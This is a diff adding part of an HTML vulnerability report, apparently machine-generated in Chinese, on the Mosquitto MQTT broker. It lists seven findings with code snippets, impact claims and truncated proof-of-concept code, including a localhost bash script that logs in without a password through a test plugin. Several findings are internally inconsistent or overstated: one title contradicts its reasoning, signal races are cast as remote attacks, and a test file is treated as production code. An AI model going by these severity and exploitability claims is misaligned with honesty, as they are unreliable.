+                <h3>VULN-DBB88CCC - 信号处理函数中调用非异步信号安全函数</h3>
+                <span class="severity" style="background:#ffc107;color:white;padding:2px 8px;border-radius:3px;">MEDIUM</span>
+                <p><strong>文件:</strong> src\signals.c:37</p>
+                <p><strong>代码片段:</strong></p>
+                <pre><code>static void handle_signal(int signal)
+{
+	UNUSED(signal);
+
+	if(signal == SIGINT || signal == SIGTERM){
+		g_run = 0;
+#ifdef SIGHUP
+	}else if(signal == SIGHUP){
+		flag_reload = true;
+#endif
+#ifdef SIGUSR1
+	}else if(signal == SIGUSR1){
+#ifdef WITH_PERSISTENCE
+		flag_db_backup = true;
+#endif
+#endif
+#ifdef SIGUSR2
+	}else if(signal == SIGUSR2){
+		flag_tree_print = true;
+		flag_xtreport = true;
+#endif
+#ifdef SIGRTMIN
+	}else if(signal == SIGRTMIN){
+		flag_log_rotate = true;
+#endif
+	}
+}</code></pre>
+                <p><strong>数据流:</strong> 信号处理函数handle_signal被signal()注册，在信号到达时异步执行。该函数修改了多个全局变量。</p>
+                <p><strong>判断理由:</strong> 虽然handle_signal本身只修改了全局变量，没有直接调用非异步信号安全的函数，但signal()函数本身在POSIX中已被标记为过时，推荐使用sigaction()。signal()在不同Unix实现中的行为不一致（有些系统会重置信号处理为SIG_DFL），可能导致信号处理不可靠。更关键的是，这些被修改的全局变量（flag_*）不是volatile sig_atomic_t类型，在多线程或信号上下文中访问这些变量是未定义行为。</p>
+                <p><strong>影响分析:</strong> 该漏洞允许攻击者通过发送精心构造的信号序列，利用信号处理函数中的竞态条件导致Mosquitto Broker出现未定义行为。具体影响包括：1) 配置重载不完整导致安全策略失效；2) 数据库备份操作与主循环冲突导致数据损坏；3) 日志轮转操作导致日志丢失或损坏；4) 订阅树打印操作导致内存访问错误；5) 在极端情况下可能导致Broker崩溃，造成MQTT服务中断。由于Mosquitto常用于IoT和边缘计算场景，此类漏洞可能导致大规模设备断连或消息丢失。</p>
+                <details><summary>PoC代码</summary><pre><code>/*
+ * PoC代码 - 仅供研究使用
+ * 漏洞: Mosquitto MQTT Broker 信号处理函数中修改非volatile sig_atomic_t类型全局变量
+ * 目标: 演示信号处理函数中未定义行为导致的竞态条件
+ */
+
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;signal.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;pthread.h&gt;
+#include &lt;stdbool.h&gt;
+#include &lt;string.h&gt;
+
+/* 模拟Mosquitto中的全局变量声明（非volatile sig_atomic_t） */
+int g_run = 1;
+static bool flag_reload = false;
+static bool flag_log_rotate = false;
+static bool flag_db_backup = false;
+static bool flag_tree_p</code></pre></details>
+            </div>
+            <div class="vuln-card" style="border-left: 4px solid #ffc107;">
+                <h3>VULN-0876E455 - Windows线程中缺少同步机制</h3>
+                <span class="severity" style="background:#ffc107;color:white;padding:2px 8px;border-radius:3px;">MEDIUM</span>
+                <p><strong>文件:</strong> src\signals.c:119</p>
+                <p><strong>代码片段:</strong></p>
+                <pre><code>DWORD WINAPI SigThreadProc(void *data)
+{
+	...
+	while(g_run){
+		int wr = WaitForMultipleObjects(MOSQ_MAX_EVTS, evt, FALSE, INFINITE);
+		switch(wr){
+			case WAIT_OBJECT_0 + 0:
+				handle_signal(SIGINT);
+				break;
+			case WAIT_OBJECT_0 + 1:
+				flag_reload = true;
+				continue;
+			...
+		}
+	}
+	...
+}</code></pre>
+                <p><strong>数据流:</strong> SigThreadProc线程修改flag_reload、flag_db_backup、flag_tree_print、flag_xtreport、flag_log_rotate和g_run变量，而主线程在signal__flag_check()中读取这些变量。</p>
+                <p><strong>判断理由:</strong> 在Windows版本中，SigThreadProc线程和主线程之间共享多个全局变量（flag_*和g_run），但没有使用任何同步机制（如互斥锁、临界区、原子操作）。这导致数据竞争（data race），根据C11标准，这是未定义行为。虽然在实际中bool类型的读写可能是原子的，但编译器优化可能导致意外的行为，例如变量值被缓存、指令重排等。</p>
+                <p><strong>影响分析:</strong> 此漏洞允许攻击者利用数据竞争导致Mosquitto broker出现未定义行为。具体影响包括：1) 配置重载失败 - 当flag_reload被部分读取时，配置更改可能不会生效；2) 日志轮转丢失 - flag_log_rotate的状态不一致可能导致日志轮转被跳过；3) 持久化备份跳过 - flag_db_backup的竞争条件可能导致数据库备份操作被跳过；4) 树打印和报告生成异常 - flag_tree_print和flag_xtreport的竞争可能导致输出不完整或错误。在极端情况下，g_run变量的竞争条件可能导致broker意外关闭或无法正常关闭。虽然单个竞争条件的影响可能有限，但持续利用可能导致broker行为不稳定，影响MQTT服务的可靠性。</p>
+                <details><summary>PoC代码</summary><pre><code>/*
+ * PoC: Mosquitto Windows线程同步缺失漏洞利用演示
+ * 仅供研究使用 - 请勿用于非法用途
+ * 
+ * 编译: cl /nologo /Fe:poc_vuln_0876E455.exe poc_vuln_0876E455.c
+ * 运行: 在Windows上启动mosquitto broker后运行此程序
+ */
+
+#include &lt;windows.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;time.h&gt;
+
+/* 模拟主线程读取flag的行为 - 类似于signal__flag_check() */
+volatile bool flag_reload = false;
+volatile bool flag_log_rotate = false;
+volatile bool flag_db_backup = false;
+volatile bool flag_tree_print = false;
+volatile bool flag_xtre</code></pre></details>
+            </div>
+            <div class="vuln-card" style="border-left: 4px solid #28a745;">
+                <h3>VULN-7FDAB0E3 - 信号处理函数中修改非原子类型变量</h3>
+                <span class="severity" style="background:#28a745;color:white;padding:2px 8px;border-radius:3px;">LOW</span>
+                <p><strong>文件:</strong> src\signals.c:37</p>
+                <p><strong>代码片段:</strong></p>
+                <pre><code>static void handle_signal(int signal)
+{
+	UNUSED(signal);
+
+	if(signal == SIGINT || signal == SIGTERM){
+		g_run = 0;
+#ifdef SIGHUP
+	}else if(signal == SIGHUP){
+		flag_reload = true;
+#endif
+...</code></pre>
+                <p><strong>数据流:</strong> 信号处理函数修改g_run和flag_*变量，这些变量在signal__flag_check()中被读取。</p>
+                <p><strong>判断理由:</strong> 根据POSIX标准，信号处理函数只能修改类型为volatile sig_atomic_t的变量。g_run是int类型，flag_*是bool类型，都不是sig_atomic_t。虽然在实际实现中int和bool的赋值可能是原子的，但标准不保证这一点。在非原子类型上，信号处理函数和主程序之间的访问可能导致部分写入（torn read/write）问题。</p>
+                <p><strong>影响分析:</strong> 该漏洞影响Mosquitto MQTT broker的信号处理机制。虽然在实际实现中，对int和bool类型的赋值在大多数架构上是原子的，但POSIX标准不保证这一点。主要风险包括：1) 编译器优化可能导致信号处理函数中对g_run和flag_*变量的修改在主循环中不可见，导致信号被忽略；2) 在多核系统上，由于缓存一致性协议，可能读取到过时的变量值；3) 在极端情况下，非原子读写可能导致torn read/write，即读取到部分更新的值。这可能导致broker无法正确响应关闭、重载配置等信号，影响服务的可靠性和可用性。</p>
+                <details><summary>PoC代码</summary><pre><code>/*
+ * PoC代码 - 仅供研究使用
+ * 漏洞: 信号处理函数中修改非原子类型变量
+ * 目标: Mosquitto MQTT broker (src/signals.c)
+ *
+ * 此PoC演示了在信号处理函数中修改非volatile sig_atomic_t类型变量
+ * 可能导致的数据竞争和torn read/write问题
+ */
+
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;signal.h&gt;
+#include &lt;stdbool.h&gt;
+#include &lt;pthread.h&gt;
+#include &lt;unistd.h&gt;
+
+/* 模拟Mosquitto中的变量声明 */
+int g_run = 1;           /* 非volatile, 非sig_atomic_t */
+bool flag_reload = false; /* 非volatile, 非sig_atomic_t */
+
+/* 模拟信号处理函数 - 与Mosquitto代码一致</code></pre></details>
+            </div>
+            <div class="vuln-card" style="border-left: 4px solid #fd7e14;">
+                <h3>VULN-3B586E7C - 缓冲区溢出/越界访问</h3>
+                <span class="severity" style="background:#fd7e14;color:white;padding:2px 8px;border-radius:3px;">HIGH</span>
+                <p><strong>文件:</strong> src/topic_tok.c:108</p>
+                <p><strong>代码片段:</strong></p>
+                <pre><code>if((*local_sub)[0] != &#x27;$&#x27;){
+    (*topics)[topic_index] = &quot;&quot;;
+    topic_index++;
+}</code></pre>
+                <p><strong>数据流:</strong> 用户输入subtopic -&gt; mosquitto_strdup复制到local_sub -&gt; 根据&#x27;/&#x27;数量分配topics数组 -&gt; 当subtopic以&#x27;/&#x27;开头时，count计算错误导致数组越界</p>
+                <p><strong>判断理由:</strong> 当subtopic以&#x27;/&#x27;开头时，strchr循环计算count会少算一个层级。例如输入&#x27;/a/b&#x27;，count=2，但实际有3个token（&#x27;&#x27;, &#x27;a&#x27;, &#x27;b&#x27;）。第108行无条件添加空字符串，导致topic_index可能超过count+2的数组边界，造成缓冲区溢出。</p>
+                <p><strong>影响分析:</strong> 该漏洞允许攻击者通过精心构造的MQTT订阅主题字符串触发缓冲区溢出。当subtopic以&#x27;/&#x27;开头或包含连续斜杠时，count计算错误导致分配的数组大小不足，后续的token添加操作会越界写入相邻内存。成功利用可能导致：1) 服务崩溃（DoS）；2) 内存数据损坏；3) 在特定条件下可能实现代码执行。影响范围包括所有使用该函数的MQTT broker和客户端。</p>
+                <details><summary>PoC代码</summary><pre><code>/*
+ * PoC for VULN-3B586E7C - 缓冲区溢出/越界访问
+ * 仅供研究使用
+ * 
+ * 编译: gcc -o poc_topic_tok poc_topic_tok.c -I/path/to/mosquitto/headers
+ * 运行: ./poc_topic_tok
+ */
+
+#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+#include &lt;stdlib.h&gt;
+
+/* 模拟mosquitto_strdup */
+char *mosquitto_strdup(const char *s) {
+    if (!s) return NULL;
+    size_t len = strlen(s) + 1;
+    char *dup = malloc(len);
+    if (dup) memcpy(dup, s, len);
+    return dup;
+}
+
+/* 模拟mosquitto_calloc */
+void *mosquitto_calloc(size_t nmemb, </code></pre></details>
+            </div>
+            <div class="vuln-card" style="border-left: 4px solid #fd7e14;">
+                <h3>VULN-7AB04584 - 缓冲区溢出/越界访问</h3>
+                <span class="severity" style="background:#fd7e14;color:white;padding:2px 8px;border-radius:3px;">HIGH</span>
+                <p><strong>文件:</strong> src/topic_tok.c:130</p>
+                <p><strong>代码片段:</strong></p>
+                <pre><code>for(int i=1; i&lt;count-1; i++){
+    (*topics)[i] = (*topics)[i+1];
+}</code></pre>
+                <p><strong>数据流:</strong> 用户输入subtopic -&gt; 解析到topics数组 -&gt; 循环移动数组元素时可能越界</p>
+                <p><strong>判断理由:</strong> 当subtopic以&#x27;/&#x27;开头时，count计算错误。例如输入&#x27;/$share/name/topic&#x27;，count=3，但实际有4个token。循环i从1到1，访问(*topics)[2]可能越界。同时(*topics)[count-1] = NULL可能覆盖错误位置。</p>
+                <p><strong>影响分析:</strong> 该漏洞可能导致以下影响：
+1. 内存越界访问：当count计算与实际token数量不一致时，循环访问(*topics)[i+1]可能访问到数组边界之外的内存
+2. 数据损坏：(*topics)[count-1] = NULL操作可能覆盖错误的内存位置，导致后续使用topics数组时出现空指针解引用
+3. 信息泄露：越界读取可能泄露相邻内存区域的数据
+4. 拒绝服务：空指针解引用或内存访问异常可能导致Broker崩溃
+5. 在特定条件下，可能被利用实现远程代码执行（取决于内存布局和攻击者控制能力）</p>
+                <details><summary>PoC代码</summary><pre><code>/*
+ * PoC代码 - 仅供研究使用
+ * 漏洞: VULN-7AB04584 - 缓冲区溢出/越界访问
+ * 文件: src/topic_tok.c
+ * 函数: sub__topic_tokenise
+ * 
+ * 编译: gcc -o poc_vuln_7AB04584 poc_vuln_7AB04584.c -I./include
+ * 运行: ./poc_vuln_7AB04584
+ */
+
+#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+#include &lt;stdlib.h&gt;
+
+/* 模拟mosquitto内部结构 */
+#define MOSQ_ERR_SUCCESS 0
+#define MOSQ_ERR_INVAL 1
+#define MOSQ_ERR_NOMEM 2
+#define MOSQ_ERR_PROTOCOL 3
+
+/* 模拟strtok_hier函数 */
+static char *strtok_hier(char *str, char **saveptr)
+{
+    char *c;
+</code></pre></details>
+            </div>
+            <div class="vuln-card" style="border-left: 4px solid #ffc107;">
+                <h3>VULN-C782EF88 - 逻辑错误/数组索引错误</h3>
+                <span class="severity" style="background:#ffc107;color:white;padding:2px 8px;border-radius:3px;">MEDIUM</span>
+                <p><strong>文件:</strong> src/topic_tok.c:82</p>
+                <p><strong>代码片段:</strong></p>
+                <pre><code>count = 0;
+saveptr = *local_sub;
+while(saveptr){
+    saveptr = strchr(&amp;saveptr[1], &#x27;/&#x27;);
+    count++;
+}</code></pre>
+                <p><strong>数据流:</strong> 用户输入subtopic -&gt; 复制到local_sub -&gt; 计算&#x27;/&#x27;数量</p>
+                <p><strong>判断理由:</strong> 当subtopic以&#x27;/&#x27;开头时，例如&#x27;/a/b&#x27;，strchr从位置1开始查找，只找到1个&#x27;/&#x27;，count=2。但实际有3个层级（空字符串、a、b）。这导致后续所有数组操作都基于错误的count值，造成一系列越界访问。</p>
+                <p><strong>影响分析:</strong> 该漏洞允许攻击者通过发送特制的MQTT订阅主题（以&#x27;/&#x27;开头）触发堆缓冲区溢出。由于count计算错误导致分配的数组过小，而后续的strtok_hier解析会写入更多元素，造成堆内存越界写入。这可能导致：1) broker进程崩溃（DoS）；2) 在特定内存布局下可能实现代码执行；3) 破坏堆管理数据结构，导致后续内存操作异常。由于该函数在订阅处理路径中，远程攻击者无需认证即可触发。</p>
+                <details><summary>PoC代码</summary><pre><code>/*
+ * PoC代码 - 仅供安全研究使用
+ * 漏洞: sub__topic_tokenise 函数中数组索引错误导致的堆缓冲区溢出
+ * 影响: Mosquitto MQTT Broker
+ */
+
+#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+#include &lt;stdlib.h&gt;
+
+/* 模拟漏洞函数的关键部分 */
+int sub__topic_tokenise_poc(const char *subtopic, char **local_sub, char ***topics)
+{
+    char *saveptr = NULL;
+    char *token;
+    int count;
+    int topic_index = 0;
+    size_t len;
+
+    if(!subtopic){
+        return -1;
+    }
+
+    len = strlen(subtopic);
+    if(len == 0){
+        return -1;
+    }</code></pre></details>
+            </div>
+            <div class="vuln-card" style="border-left: 4px solid #ffc107;">
+                <h3>VULN-D0081D01 - 硬编码凭证</h3>
+                <span class="severity" style="background:#ffc107;color:white;padding:2px 8px;border-radius:3px;">MEDIUM</span>
+                <p><strong>文件:</strong> test\broker\c\bad_v3_1.c:74</p>
+                <p><strong>代码片段:</strong></p>
+                <pre><code>}else if(!strcmp(username, &quot;readonly&quot;) || !strcmp(username, &quot;readwrite&quot;)){</code></pre>
+                <p><strong>数据流:</strong> 用户名&#x27;readonly&#x27;和&#x27;readwrite&#x27;硬编码在代码中，且这些用户无需密码即可通过认证。</p>
+                <p><strong>判断理由:</strong> 用户名&#x27;readonly&#x27;和&#x27;readwrite&#x27;被硬编码，且认证逻辑中未检查密码（password参数被忽略），导致任何知道这些用户名的人都可以无需密码直接登录，存在未授权访问风险。</p>
+                <p><strong>影响分析:</strong> 该漏洞允许任何知道硬编码用户名（&#x27;readonly&#x27;和&#x27;readwrite&#x27;）的攻击者无需密码即可连接MQTT代理。&#x27;readonly&#x27;用户可以订阅任意主题（除包含通配符#和+的主题外），&#x27;readwrite&#x27;用户可以发布消息到&#x27;writeable&#x27;主题和读取&#x27;readonly&#x27;主题。这导致：1) 敏感数据泄露风险，攻击者可订阅所有消息；2) 消息伪造风险，攻击者可向&#x27;writeable&#x27;主题发布恶意消息；3) 认证机制完全失效，密码验证被绕过。</p>
+                <details><summary>PoC代码</summary><pre><code>#!/bin/bash
+# 仅供研究使用 - 硬编码凭证漏洞PoC
+# 漏洞：test/broker/c/bad_v3_1.c 中 mosquitto_auth_unpwd_check 函数
+# 用户名 &#x27;readonly&#x27; 和 &#x27;readwrite&#x27; 无需密码即可通过认证
+
+# 前置条件：需要安装 mosquitto_pub 和 mosquitto_sub 客户端工具
+# 假设 MQTT 代理运行在 localhost:1883
+
+BROKER_HOST=&quot;localhost&quot;
+BROKER_PORT=1883
+
+# PoC 1: 使用 &#x27;readonly&#x27; 用户无需密码连接并订阅主题
+echo &quot;=== PoC 1: 使用 &#x27;readonly&#x27; 用户无需密码连接 ===&quot;
+echo &quot;尝试连接并订阅 &#x27;test/topic&#x27;...&quot;
+mosquitto_sub -h $BROKER_HOST -p $BROKER_PORT </code></pre></details>
+            </div>
+
+    <hr>
+    <p style="color:#666;font-size:0.9em;">报告由 CodeSentinel 自动生成 | 2026-07-11 19:14:25</p>
+</div>
+</body>
+</html>
